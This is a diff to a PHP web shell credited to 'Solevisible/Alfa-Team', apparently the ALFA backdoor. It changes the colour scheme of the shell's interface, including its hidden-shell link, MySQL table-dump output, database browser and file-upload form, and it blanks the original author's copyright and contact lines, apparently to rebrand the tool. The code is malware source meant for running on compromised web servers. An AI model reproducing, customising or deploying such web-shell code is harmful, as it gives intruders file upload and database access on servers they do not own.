@@ -1,5 +1,3 @@
-
-
 <?php
 /*
 	Author: 	Solevisible/Alfa-Team
@@ -197,9 +195,9 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		),
 		"header_vars" => "#ffffff",
 		"header_values" => "#ffffff",
-		"header_on" => "#00FF00",
+		"header_on" => "#fff700",
 		"header_off" => "#ff0000",
-		"header_none" => "#00FF00",
+		"header_none" => "#fff700",
 		"home_shell" => "#ff0000",
 		"home_shell:hover" => array(
 			"key_color" => "#FFFFFF",
@@ -214,21 +212,21 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".back_shell:hover" => "color: {color};",
 			)
 		),
-		"header_pwd" => "#00FF00",
+		"header_pwd" => "#fff700",
 		"header_pwd:hover" => array(
 			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".header_pwd:hover" => "color: {color};",
 			)
 		),
-		"header_drive" => "#00FF00",
+		"header_drive" => "#fff700",
 		"header_drive:hover" => array(
 			"key_color" => "#FFFFFF",
 			"multi_selector" => array(
 				".header_drive:hover" => "color: {color};",
 			)
 		),
-		"header_show_all" => "#00FF00",
+		"header_show_all" => "#fff700",
 		"disable_functions" => "#ff0000",
 		"footer_text" => "#e6e6e6",
 		"menu_options" => "#e6e6e6",
@@ -239,7 +237,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"options_list" => array(
-			"key_color" => "#00FF00",
+			"key_color" => "#fff700",
 			"multi_selector" => array(
 				".content_options_holder .header center a" => "color: {color};",
 			)
@@ -269,7 +267,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 			)
 		),
 		"hidden_shell_text" => array(
-			"key_color" => "#00FF00",
+			"key_color" => "#fff700",
 			"multi_selector" => array(
 				"#hidden_sh a" => "color: {color};",
 			)
@@ -494,7 +492,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 				".up_bar" => "background-color: {color};",
 			)
 		),
-		"mysql_tables" => "#00FF00",
+		"mysql_tables" => "#fff700",
 		"mysql_table_count" => "#e400ff",
 		"copyright" => "#dfff00",
 		"scrollbar" => array(
@@ -1484,7 +1482,7 @@ __alert("<span style='color:red;'>UserName is Empty !</span>");
 }elseif($_POST["alfa8"] == "color"){
 echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
 echo '<table border="1"><tbody>';
-$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#00FF00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
+$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#fff700">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#ffffff" value="{color}"></td></tr>';
 $x = 1;
 foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
 	$multi = "";
@@ -1647,7 +1645,7 @@ if(count($selected_data) > 0){
 			$tbls .= "Done ~~~> ".$file_name."<br>";
 		}
 		echo __pre();
-		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
+		echo "<center><font color='#fff700'>".$tbls."</font></center>";
 	}
 }
 if(!empty($dbname) && count($selected_data) == 0){
@@ -1671,9 +1669,9 @@ if($db){
 
 	echo '<ul id="myUL">';
 	foreach($data as $tbl => $cols){
-	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
+	    echo '<li><span style="color:#fff700;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
 	    foreach($cols["cols"] as $col){
-	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
+	        echo '<li tbl="'.$tbl.'"><span style="color:#fff700;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
 	    }
 	    echo '</ul></li>';
 	}
@@ -2303,7 +2301,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Batosay1337 &copy; 2020-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>batosay1337[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@batosay1337</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'></span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'></a></span> <span style='letter-spacing: 2px;color: #dfff00;'></span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'></a></span></div></td>
 </tr>
 </table>
 </div>
